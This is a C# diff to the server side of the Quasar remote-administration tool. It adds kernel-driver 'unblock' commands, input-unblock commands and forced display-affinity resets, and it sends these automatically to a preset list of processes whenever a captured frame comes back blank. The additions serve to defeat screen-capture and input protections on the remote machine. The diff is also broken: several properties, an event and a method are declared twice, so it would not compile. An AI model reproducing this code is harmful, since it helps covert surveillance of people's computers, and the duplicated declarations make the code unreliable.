@@ -59,6 +59,25 @@ namespace Quasar.Server.Messages
         }
 
         /// <summary>
+        /// <summary>
+        /// Determines whether the cursor should be included in captured frames.
+        /// </summary>
+        public bool IncludeCursor
+        {
+            get => _includeCursor;
+            set => _includeCursor = value;
+        }
+
+        /// <summary>
+        /// Indicates if each capture request should force an affinity reset on the client.
+        /// </summary>
+        public bool ForceAffinityReset
+        {
+            get => _forceAffinityReset;
+            set => _forceAffinityReset = value;
+        }
+
+        /// <summary>
         /// Represents the method that will handle display changes.
         /// </summary>
         /// <param name="sender">The message processor which raised the event.</param>
@@ -75,6 +94,26 @@ namespace Quasar.Server.Messages
         public event DisplaysChangedEventHandler DisplaysChanged;
 
         /// <summary>
+        /// Raised whenever the client reports a new kernel driver status.
+        /// </summary>
+        public event EventHandler<KernelDriverStatusResponse> DriverStatusChanged;
+
+        /// <summary>
+        /// Raised after the client replies to a kernel unblock request.
+        /// </summary>
+        public event EventHandler<KernelUnblockResult> KernelUnblockCompleted;
+
+        /// <summary>
+        /// Raised after the client responds to an input unblock request.
+        /// </summary>
+        public event EventHandler<InputUnblockResult> InputUnblockCompleted;
+
+        /// <summary>
+        /// Raised after the client replies to an input unblock request.
+        /// </summary>
+        public event EventHandler<InputUnblockResult> InputUnblockCompleted;
+
+        /// <summary>
         /// Reports changed displays.
         /// </summary>
         /// <param name="value">All currently available displays.</param>
@@ -87,6 +126,38 @@ namespace Quasar.Server.Messages
             }, value);
         }
 
+        private void OnDriverStatusChanged(KernelDriverStatusResponse response)
+        {
+            SynchronizationContext.Post(state =>
+            {
+                DriverStatusChanged?.Invoke(this, (KernelDriverStatusResponse)state);
+            }, response);
+        }
+
+        private void OnKernelUnblockCompleted(KernelUnblockResult result)
+        {
+            SynchronizationContext.Post(state =>
+            {
+                KernelUnblockCompleted?.Invoke(this, (KernelUnblockResult)state);
+            }, result);
+        }
+
+        private void OnInputUnblockCompleted(InputUnblockResult result)
+        {
+            SynchronizationContext.Post(state =>
+            {
+                InputUnblockCompleted?.Invoke(this, (InputUnblockResult)state);
+            }, result);
+        }
+
+        private void OnInputUnblockCompleted(InputUnblockResult result)
+        {
+            SynchronizationContext.Post(state =>
+            {
+                InputUnblockCompleted?.Invoke(this, (InputUnblockResult)state);
+            }, result);
+        }
+
         /// <summary>
         /// The client which is associated with this remote desktop handler.
         /// </summary>
@@ -96,6 +167,65 @@ namespace Quasar.Server.Messages
         /// The video stream codec used to decode received frames.
         /// </summary>
         private UnsafeStreamCodec _codec;
+        private int _consecutiveBlankFrames;
+
+        private bool _includeCursor = true;
+        private bool _forceAffinityReset;
+        private bool _requireDriver = true;
+
+        public bool IncludeCursor
+        {
+            get => _includeCursor;
+            set => _includeCursor = value;
+        }
+
+        public bool ForceAffinityReset
+        {
+            get => _forceAffinityReset;
+            set => _forceAffinityReset = value;
+        }
+
+        /// <summary>
+        /// Tracks the last driver state reported by the client.
+        /// </summary>
+        public KernelDriverState DriverState { get; private set; } = KernelDriverState.Unknown;
+
+        /// <summary>
+        /// Tracks the last driver version reported by the client.
+        /// </summary>
+        public string DriverVersion { get; private set; } = string.Empty;
+
+        /// <summary>
+        /// Tracks the last frame id received from the client.
+        /// </summary>
+        public long LastFrameId { get; private set; }
+
+        /// <summary>
+        /// Determines whether captured frames should include the cursor overlay.
+        /// </summary>
+        public bool IncludeCursor
+        {
+            get => _includeCursor;
+            set => _includeCursor = value;
+        }
+
+        /// <summary>
+        /// Forces the client to reapply SetWindowDisplayAffinity before capturing.
+        /// </summary>
+        public bool ForceAffinityReset
+        {
+            get => _forceAffinityReset;
+            set => _forceAffinityReset = value;
+        }
+
+        /// <summary>
+        /// Indicates if the kernel driver must be running before unblock commands execute.
+        /// </summary>
+        public bool RequireDriver
+        {
+            get => _requireDriver;
+            set => _requireDriver = value;
+        }
 
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
@@ -107,7 +237,11 @@ namespace Quasar.Server.Messages
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetDesktopResponse || message is GetMonitorsResponse;
+        public override bool CanExecute(IMessage message) => message is GetDesktopResponse ||
+                                                             message is GetMonitorsResponse ||
+                                                             message is KernelDriverStatusResponse ||
+                                                             message is KernelUnblockResult ||
+                                                             message is InputUnblockResult;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -122,6 +256,15 @@ namespace Quasar.Server.Messages
                     break;
                 case GetMonitorsResponse m:
                     Execute(sender, m);
+                    break;
+                case KernelDriverStatusResponse status:
+                    Execute(sender, status);
+                    break;
+                case KernelUnblockResult result:
+                    Execute(sender, result);
+                    break;
+                case InputUnblockResult inputResult:
+                    Execute(sender, inputResult);
                     break;
             }
         }
@@ -138,8 +281,67 @@ namespace Quasar.Server.Messages
                 IsStarted = true;
                 _codec?.Dispose();
                 _codec = null;
-                _client.Send(new GetDesktop { CreateNew = true, Quality = quality, DisplayIndex = display });
+                _client.Send(new GetDesktop
+                {
+                    CreateNew = true,
+                    Quality = quality,
+                    DisplayIndex = display,
+                    IncludeCursor = _includeCursor,
+                    ForceAffinityReset = _forceAffinityReset
+                });
             }
+        }
+
+        /// <summary>
+        /// Sends a kernel unblock request to the client.
+        /// </summary>
+        /// <param name="processName">Target process name without extension.</param>
+        /// <param name="includeChildren">Whether child processes should be inspected.</param>
+        /// <param name="driverAction">What the client should do with the kernel driver before executing.</param>
+        /// <param name="force">Force execution even if state is degraded.</param>
+        public void SendKernelUnblock(string processName, bool includeChildren, bool requireDriver, bool forceResetAffinity, KernelDriverAction driverAction, bool force)
+        {
+            if (string.IsNullOrWhiteSpace(processName))
+                throw new ArgumentException("Process name required.", nameof(processName));
+
+            _client.Send(new DoKernelUnblock
+            {
+                ProcessName = processName,
+                IncludeChildProcesses = includeChildren,
+                RequireDriver = requireDriver,
+                ForceResetAffinity = forceResetAffinity,
+                ExpectedDriverState = DriverState,
+                DriverAction = driverAction,
+                Force = force
+            });
+        }
+
+        /// <summary>
+        /// Sends an input-unblock request to the client.
+        /// </summary>
+        public void SendInputUnblock(bool unblockMouse, bool unblockKeyboard, bool forceBlockReset, bool forceHookCleanup)
+        {
+            _client.Send(new DoInputUnblock
+            {
+                UnblockMouse = unblockMouse,
+                UnblockKeyboard = unblockKeyboard,
+                ForceBlockInputReset = forceBlockReset,
+                ForceHookCleanup = forceHookCleanup
+            });
+        }
+
+        /// <summary>
+        /// Requests the latest kernel driver state from the client.
+        /// </summary>
+        /// <param name="driverAction">Optional action to perform while reporting.</param>
+        /// <param name="forceRefresh">When true, bypasses cached state.</param>
+        public void RequestKernelDriverStatus(KernelDriverAction driverAction = KernelDriverAction.QueryStatus, bool forceRefresh = false)
+        {
+            _client.Send(new GetKernelDriverStatus
+            {
+                DriverAction = driverAction,
+                ForceRefresh = forceRefresh
+            });
         }
 
         /// <summary>
@@ -202,6 +404,28 @@ namespace Quasar.Server.Messages
                 if (!IsStarted)
                     return;
 
+                LastFrameId = message.FrameId;
+
+                if (message.Image == null || message.Image.Length == 0)
+                {
+                    HandleBlankFrame(client, message);
+                    return;
+                }
+
+                _consecutiveBlankFrames = 0;
+
+                if (message.DriverState != KernelDriverState.Unknown && message.DriverState != DriverState)
+                {
+                    DriverState = message.DriverState;
+                    OnDriverStatusChanged(new KernelDriverStatusResponse
+                    {
+                        State = DriverState,
+                        Version = DriverVersion,
+                        WatchdogActive = false,
+                        Message = message.FrameId > 0 ? $"Reported via frame #{message.FrameId}" : "Reported via frame."
+                    });
+                }
+
                 if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                 {
                     _codec?.Dispose();
@@ -216,13 +440,66 @@ namespace Quasar.Server.Messages
                 
                 message.Image = null;
 
-                client.Send(new GetDesktop {Quality = message.Quality, DisplayIndex = message.Monitor});
+                client.Send(new GetDesktop
+                {
+                    Quality = message.Quality,
+                    DisplayIndex = message.Monitor,
+                    IncludeCursor = _includeCursor,
+                    ForceAffinityReset = _forceAffinityReset
+                });
             }
+        }
+
+        private void HandleBlankFrame(ISender client, GetDesktopResponse template)
+        {
+            _consecutiveBlankFrames++;
+
+            _forceAffinityReset = true;
+
+            foreach (var process in KernelUnblockPresets.ProcessNames)
+            {
+                try
+                {
+                    SendKernelUnblock(process, includeChildren: true, requireDriver: _requireDriver, forceResetAffinity: true, driverAction: KernelDriverAction.EnsureRunning, force: true);
+                }
+                catch
+                {
+                    // ignore auto recovery errors
+                }
+            }
+
+            RequestKernelDriverStatus(KernelDriverAction.EnsureRunning, true);
+
+            client.Send(new GetDesktop
+            {
+                CreateNew = true,
+                Quality = template.Quality,
+                DisplayIndex = template.Monitor,
+                IncludeCursor = _includeCursor,
+                ForceAffinityReset = _forceAffinityReset
+            });
         }
 
         private void Execute(ISender client, GetMonitorsResponse message)
         {
             OnDisplaysChanged(message.Number);
+        }
+
+        private void Execute(ISender client, KernelDriverStatusResponse message)
+        {
+            DriverState = message.State;
+            DriverVersion = message.Version ?? string.Empty;
+            OnDriverStatusChanged(message);
+        }
+
+        private void Execute(ISender client, KernelUnblockResult message)
+        {
+            OnKernelUnblockCompleted(message);
+        }
+
+        private void Execute(ISender client, InputUnblockResult message)
+        {
+            OnInputUnblockCompleted(message);
         }
 
         /// <summary>
